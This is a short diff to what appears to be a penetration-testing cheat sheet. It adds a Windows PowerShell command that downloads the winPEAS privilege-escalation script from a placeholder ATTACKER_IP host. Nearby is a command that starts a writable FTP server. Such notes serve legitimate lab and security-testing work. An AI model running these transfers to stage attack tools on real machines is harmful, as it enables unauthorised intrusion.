@@ -19,6 +19,12 @@ ftp
 <pre><code>sudo pip3 install pyftpdlib
 <strong>sudo python3 -m pyftpdlib -w -p 21</strong></code></pre>
 
+windows
+
+```
+invoke-webrequest -Uri 'http://ATTACKER_IP/winPEAS.bat' -OutFile winpeas.bat
+```
+
 ## Enumeration
 
 ### DNS Enumeration
